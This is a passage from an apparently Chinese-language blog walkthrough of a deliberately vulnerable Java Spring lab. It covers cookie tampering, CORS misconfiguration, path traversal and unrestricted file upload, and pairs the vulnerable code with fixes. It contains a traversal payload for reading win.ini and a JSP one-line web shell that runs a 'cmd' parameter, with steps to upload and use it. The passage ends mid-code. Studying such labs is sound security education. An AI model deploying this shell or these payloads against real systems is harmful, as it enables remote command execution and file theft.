<h4 id="2-cookie-vuln02"><a href="#2-cookie-vuln02" class="headerlink" title="2.&#x2F;cookie&#x2F;vuln02"></a>2.&#x2F;cookie&#x2F;vuln02</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(value = &quot;/vuln02&quot;)</span><br><span class="line">   public String vuln02(HttpServletRequest req) &#123;</span><br><span class="line">       String nick = null;</span><br><span class="line">       Cookie[] cookie = req.getCookies();</span><br><span class="line"></span><br><span class="line">       if (cookie != null) &#123;</span><br><span class="line">           nick = getCookie(req, NICK).getValue();  // key code</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="3-cookie-vuln03"><a href="#3-cookie-vuln03" class="headerlink" title="3.&#x2F;cookie&#x2F;vuln03"></a>3.&#x2F;cookie&#x2F;vuln03</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   @GetMapping(value = &quot;/vuln03&quot;)</span><br><span class="line">    public String vuln03(HttpServletRequest req) &#123;</span><br><span class="line">        String nick = null;</span><br><span class="line">        Cookie cookies[] = req.getCookies();</span><br><span class="line">        if (cookies != null) &#123;</span><br><span class="line">            for (Cookie cookie : cookies) &#123;</span><br><span class="line">                // key code. Equals can also be equalsIgnoreCase.</span><br><span class="line">                if (NICK.equals(cookie.getName())) &#123;</span><br><span class="line">                    nick = cookie.getValue();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line">Java复制代码1234567891011121314</span><br></pre></td></tr></table></figure>

<h4 id="4-cookie-vuln04"><a href="#4-cookie-vuln04" class="headerlink" title="4.&#x2F;cookie&#x2F;vuln04"></a>4.&#x2F;cookie&#x2F;vuln04</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(value = &quot;/vuln04&quot;)</span><br><span class="line">    public String vuln04(HttpServletRequest req) &#123;</span><br><span class="line">        String nick = null;</span><br><span class="line">        Cookie cookies[] = req.getCookies();</span><br><span class="line">        if (cookies != null) &#123;</span><br><span class="line">            for (Cookie cookie : cookies) &#123;</span><br><span class="line">                if (cookie.getName().equalsIgnoreCase(NICK)) &#123;  // key code</span><br><span class="line">                    nick = cookie.getValue();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="5-cookie-vuln05"><a href="#5-cookie-vuln05" class="headerlink" title="5.&#x2F;cookie&#x2F;vuln05"></a>5.&#x2F;cookie&#x2F;vuln05</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(value = &quot;/vuln05&quot;)</span><br><span class="line"> public String vuln05(@CookieValue(&quot;nick&quot;) String nick) &#123;</span><br><span class="line">     return &quot;Cookie nick: &quot; + nick;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h4 id="6-cookie-vuln06"><a href="#6-cookie-vuln06" class="headerlink" title="6.&#x2F;cookie&#x2F;vuln06"></a>6.&#x2F;cookie&#x2F;vuln06</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(value = &quot;/vuln06&quot;)</span><br><span class="line">    public String vuln06(@CookieValue(value = &quot;nick&quot;) String nick) &#123;</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用."></a>漏洞利用.</h4><p>我们可以直接通过修改cookie的值实现对nick值的修改，某些情况可能会存在越权漏洞，操作如下：</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507291046226.png" alt="image-20250729104624089" loading="lazy"></p>
<h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><strong>跨源资源共享</strong>（CORS，全称为 Cross-Origin Resource Sharing）是一种基于 HTTP 头的机制，允许服务器标示除了它自己以外的其他源（域、协议或端口），使得浏览器允许这些源访问加载自己的资源。CORS 机制通过一种机制来检查服务器是否会允许要发送的真实请求，该机制通过浏览器发起一个到服务器托管的跨源资源的“预检”请求。</p>
<p>比如说：有两个域a1.com和b1.com，假设b1.com上面有个接口能够获取一些返回的数据，那么如果我们从a1.com写一段js去请求这个接口的数据，一般来说是请求不了的，会在浏览器爆出CORS错误，但如果有CORS设置，就可以实现这样的访问，甚至可以能够使用b1.com上的cookie。</p>
<h4 id="1-cors-vuln-origin"><a href="#1-cors-vuln-origin" class="headerlink" title="1.&#x2F;cors&#x2F;vuln&#x2F;origin"></a>1.&#x2F;cors&#x2F;vuln&#x2F;origin</h4><pre><code>private static String info = &quot;&#123;\&quot;name\&quot;: \&quot;JoyChou\&quot;, \&quot;phone\&quot;: \&quot;18200001111\&quot;&#125;&quot;;

@GetMapping(&quot;/vuln/origin&quot;)
public String vuls1(HttpServletRequest request, HttpServletResponse response) &#123;
    String origin = request.getHeader(&quot;origin&quot;);
    response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin); // set origin from header
    response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);  // allow cookie
    return info;
&#125;
</code></pre>
<h4 id="2-cors-vuln-setHeader"><a href="#2-cors-vuln-setHeader" class="headerlink" title="2.&#x2F;cors&#x2F;vuln&#x2F;setHeader"></a>2.&#x2F;cors&#x2F;vuln&#x2F;setHeader</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/vuln/setHeader&quot;)</span><br><span class="line">    public String vuls2(HttpServletResponse response) &#123;</span><br><span class="line">        // 后端设置Access-Control-Allow-Origin为*的情况下，跨域的时候前端如果设置withCredentials为true会异常</span><br><span class="line">        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);</span><br><span class="line">        return info;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="3-cors-vuln-crossOrigin"><a href="#3-cors-vuln-crossOrigin" class="headerlink" title="3.&#x2F;cors&#x2F;vuln&#x2F;crossOrigin"></a>3.&#x2F;cors&#x2F;vuln&#x2F;crossOrigin</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;*&quot;)</span><br><span class="line">@RequestMapping(&quot;/vuln/crossOrigin&quot;)</span><br><span class="line">public String vuls3() &#123;</span><br><span class="line">    return info;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>我们可以通过修改origin字段来验证漏洞</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507291407579.png" alt="image-20250729140718474" loading="lazy"></p>
<h4 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><h5 id="（1）限制origin"><a href="#（1）限制origin" class="headerlink" title="（1）限制origin"></a>（1）限制origin</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@CrossOrigin(origins = &#123;&quot;joychou.org&quot;, &quot;http://test.joychou.me&quot;&#125;)</span><br><span class="line">  @GetMapping(&quot;/sec/crossOrigin&quot;)</span><br><span class="line">  public String secCrossOrigin() &#123;</span><br><span class="line">      return info;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="（2）WebMvcConfigurer设置Cors"><a href="#（2）WebMvcConfigurer设置Cors" class="headerlink" title="（2）WebMvcConfigurer设置Cors"></a>（2）WebMvcConfigurer设置Cors</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/sec/webMvcConfigurer&quot;)</span><br><span class="line">  public CsrfToken getCsrfToken_01(CsrfToken token) &#123;</span><br><span class="line">      return token;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对应的过滤器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public WebMvcConfigurer corsConfigurer() &#123;</span><br><span class="line">    return new WebMvcConfigurerAdapter() &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void addCorsMappings(CorsRegistry registry) &#123;</span><br><span class="line">            // 为了支持一级域名，重写了checkOrigin</span><br><span class="line">            //String[] allowOrigins = &#123;&quot;joychou.org&quot;, &quot;http://test.joychou.me&quot;&#125;;</span><br><span class="line">            registry.addMapping(&quot;/cors/sec/webMvcConfigurer&quot;) // /**表示所有路由path</span><br><span class="line">                    //.allowedOrigins(allowOrigins)</span><br><span class="line">                    .allowedMethods(&quot;GET&quot;, &quot;POST&quot;)</span><br><span class="line">                    .allowCredentials(true);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="（3）spring-security设置cors"><a href="#（3）spring-security设置cors" class="headerlink" title="（3）spring security设置cors"></a>（3）spring security设置cors</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/sec/httpCors&quot;)</span><br><span class="line">public CsrfToken getCsrfToken_02(CsrfToken token) &#123;</span><br><span class="line">    return token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对应过滤器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CorsConfigurationSource corsConfigurationSource()</span><br><span class="line">&#123;</span><br><span class="line">    // Set cors origin white list</span><br><span class="line">    ArrayList&lt;String&gt; allowOrigins = new ArrayList&lt;&gt;();</span><br><span class="line">    allowOrigins.add(&quot;joychou.org&quot;);</span><br><span class="line">    allowOrigins.add(&quot;https://test.joychou.me&quot;); // 区分http和https，并且默认不会拦截同域请求。</span><br><span class="line"></span><br><span class="line">    CorsConfiguration configuration = new CorsConfiguration();</span><br><span class="line">    configuration.setAllowedOrigins(allowOrigins);</span><br><span class="line">    configuration.setAllowCredentials(true);</span><br><span class="line">    configuration.setAllowedMethods(Arrays.asList(&quot;GET&quot;, &quot;POST&quot;));</span><br><span class="line">    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();</span><br><span class="line">    source.registerCorsConfiguration(&quot;/cors/sec/httpCors&quot;, configuration); // ant style</span><br><span class="line">    return source;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="（4）自定义filter设置cors"><a href="#（4）自定义filter设置cors" class="headerlink" title="（4）自定义filter设置cors"></a>（4）自定义filter设置cors</h5><p>防御代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/sec/originFilter&quot;)</span><br><span class="line">public CsrfToken getCsrfToken_03(CsrfToken token) &#123;</span><br><span class="line">    return token;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对应过滤器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">@WebFilter(filterName = &quot;OriginFilter&quot;, urlPatterns = &quot;/cors/sec/originFilter&quot;)</span><br><span class="line">public class OriginFilter implements Filter &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private final Logger logger = LoggerFactory.getLogger(this.getClass());</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doFilter(ServletRequest req, ServletResponse res, FilterChain filterChain)</span><br><span class="line">            throws IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">        HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">        HttpServletResponse response = (HttpServletResponse) res;</span><br><span class="line"></span><br><span class="line">        String origin = request.getHeader(&quot;Origin&quot;);</span><br><span class="line">        logger.info(&quot;[+] Origin: &quot; + origin + &quot;\tCurrent url:&quot; + request.getRequestURL());</span><br><span class="line"></span><br><span class="line">        // 以file协议访问html，origin为字符串的null，所以依然会走安全check逻辑</span><br><span class="line">        if (origin != null &amp;&amp; SecurityUtil.checkURL(origin) == null) &#123;</span><br><span class="line">            logger.error(&quot;[-] Origin check error. &quot; + &quot;Origin: &quot; + origin +</span><br><span class="line">                    &quot;\tCurrent url:&quot; + request.getRequestURL());</span><br><span class="line">            response.setStatus(response.SC_FORBIDDEN);</span><br><span class="line">            response.getWriter().println(&quot;Invaid cors config by joychou.&quot;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin);</span><br><span class="line">        response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);</span><br><span class="line">        response.setHeader(&quot;Access-Control-Allow-Methods&quot;, &quot;GET, POST, OPTION&quot;);</span><br><span class="line"></span><br><span class="line">        filterChain.doFilter(req, res);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="（5）CorsFilter设置cors"><a href="#（5）CorsFilter设置cors" class="headerlink" title="（5）CorsFilter设置cors"></a>（5）CorsFilter设置cors</h5><p>防御代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;/sec/corsFilter&quot;)</span><br><span class="line">   public CsrfToken getCsrfToken_04(CsrfToken token) &#123;</span><br><span class="line">       return token;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>对应过滤器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">public class BaseCorsFilter extends CorsFilter &#123;</span><br><span class="line"></span><br><span class="line">    public BaseCorsFilter() &#123;</span><br><span class="line">        super(configurationSource());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static UrlBasedCorsConfigurationSource configurationSource() &#123;</span><br><span class="line">        CorsConfiguration config = new CorsConfiguration();</span><br><span class="line">        config.setAllowCredentials(true);</span><br><span class="line">        config.addAllowedOrigin(&quot;joychou.org&quot;); // 不支持</span><br><span class="line">        config.addAllowedOrigin(&quot;http://test.joychou.me&quot;);</span><br><span class="line">        config.addAllowedHeader(&quot;*&quot;);</span><br><span class="line">        config.addAllowedMethod(&quot;GET&quot;);</span><br><span class="line">        config.addAllowedMethod(&quot;POST&quot;);</span><br><span class="line"></span><br><span class="line">        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();</span><br><span class="line">        source.registerCorsConfiguration(&quot;/cors/sec/corsFilter&quot;, config);</span><br><span class="line"></span><br><span class="line">        return source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="（6）origin检查"><a href="#（6）origin检查" class="headerlink" title="（6）origin检查"></a>（6）origin检查</h5><p>防御代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/sec/checkOrigin&quot;)</span><br><span class="line">public String seccode(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">    String origin = request.getHeader(&quot;Origin&quot;);</span><br><span class="line"></span><br><span class="line">    // 如果origin不为空并且origin不在白名单内，认定为不安全。</span><br><span class="line">    // 如果origin为空，表示是同域过来的请求或者浏览器直接发起的请求。</span><br><span class="line">    if (origin != null &amp;&amp; SecurityUtil.checkURL(origin) == null) &#123;</span><br><span class="line">        return &quot;Origin is not safe.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin);</span><br><span class="line">    response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);</span><br><span class="line">    return LoginUtils.getUserInfo2JsonStr(request);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><h4 id="1-path-traversal-vul"><a href="#1-path-traversal-vul" class="headerlink" title="1.&#x2F;path_traversal&#x2F;vul"></a>1.&#x2F;path_traversal&#x2F;vul</h4><p>漏洞代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  @GetMapping(&quot;/path_traversal/vul&quot;)</span><br><span class="line">    public String getImage(String filepath) throws IOException &#123;</span><br><span class="line">        return getImgBase64(filepath);</span><br><span class="line">    &#125;</span><br><span class="line">private String getImgBase64(String imgFile) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">        logger.info(&quot;Working directory: &quot; + System.getProperty(&quot;user.dir&quot;));</span><br><span class="line">        logger.info(&quot;File path: &quot; + imgFile);</span><br><span class="line"></span><br><span class="line">        File f = new File(imgFile);</span><br><span class="line">        if (f.exists() &amp;&amp; !f.isDirectory()) &#123;</span><br><span class="line">            byte[] data = Files.readAllBytes(Paths.get(imgFile));</span><br><span class="line">            return new String(Base64.encodeBase64(data));</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return &quot;File doesn&#x27;t exist or is not a file.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>存在目录穿越，我们直接读取文件</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507301105109.png" alt="image-20250730110528049" loading="lazy"></p>
<p>修复代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/path_traversal/sec&quot;)</span><br><span class="line">public String getImageSec(String filepath) throws IOException &#123;</span><br><span class="line">    if (SecurityUtil.pathFilter(filepath) == null) &#123;</span><br><span class="line">        logger.info(&quot;Illegal file path: &quot; + filepath);</span><br><span class="line">        return &quot;Bad boy. Illegal file path.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return getImgBase64(filepath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pathFilter函数内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public static String pathFilter(String filepath) &#123;</span><br><span class="line">       String temp = filepath;</span><br><span class="line"></span><br><span class="line">       // use while to sovle multi urlencode</span><br><span class="line">       while (temp.indexOf(&#x27;%&#x27;) != -1) &#123;</span><br><span class="line">           try &#123;</span><br><span class="line">               temp = URLDecoder.decode(temp, &quot;utf-8&quot;);</span><br><span class="line">           &#125; catch (UnsupportedEncodingException e) &#123;</span><br><span class="line">               logger.info(&quot;Unsupported encoding exception: &quot; + filepath);</span><br><span class="line">               return null;</span><br><span class="line">           &#125; catch (Exception e) &#123;</span><br><span class="line">               logger.info(e.toString());</span><br><span class="line">               return null;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       if (temp.contains(&quot;..&quot;) || temp.charAt(0) == &#x27;/&#x27;) &#123;</span><br><span class="line">           return null;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       return filepath;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>对文件路径参数增加了过滤方法pathFilter，如果文件路径开头为&#x2F;字符或者存在..连续字符出现就返回空字符串，但是这种过滤只是简单的应对措施，如果是Windows操作系统上以盘符开始的路径，就显得无能为力。例如使用\读取（windows下）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/path_traversal/sec?filepath=..\..\..\..\..\windows\win.ini</span><br></pre></td></tr></table></figure>



<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h4 id="1-file-upload"><a href="#1-file-upload" class="headerlink" title="1.&#x2F;file&#x2F;upload"></a>1.&#x2F;file&#x2F;upload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;/upload&quot;)</span><br><span class="line">public String singleFileUpload(@RequestParam(&quot;file&quot;) MultipartFile file,</span><br><span class="line">                               RedirectAttributes redirectAttributes) &#123;</span><br><span class="line">    if (file.isEmpty()) &#123;</span><br><span class="line">        // 赋值给uploadStatus.html里的动态参数message</span><br><span class="line">        redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;Please select a file to upload&quot;);</span><br><span class="line">        return &quot;redirect:/file/status&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        // Get the file and save it somewhere</span><br><span class="line">        byte[] bytes = file.getBytes();</span><br><span class="line">        Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());</span><br><span class="line">        Files.write(path, bytes);</span><br><span class="line"></span><br><span class="line">        redirectAttributes.addFlashAttribute(&quot;message&quot;,</span><br><span class="line">                &quot;You successfully uploaded &#x27;&quot; + UPLOADED_FOLDER + file.getOriginalFilename() + &quot;&#x27;&quot;);</span><br><span class="line"></span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;upload failed&quot;);</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &quot;redirect:/file/status&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>文件上传到方法中，未判断文件的类型、扩展名等信息，也未对生成文件的文件名进行重置，只是直接将文件上传到文件保存目录中，使用测试文件成功上传。构造一句话木马：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (&quot;pass&quot;.equals(request.getParameter(&quot;pwd&quot;))) &#123; java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b)) != -1) out.println(new String(b)); &#125; %&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>保存为shell.jsp进行上传，然后传入参数pwd&#x3D;pass&amp;cmd&#x3D;whoami</p>
<p>修复代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 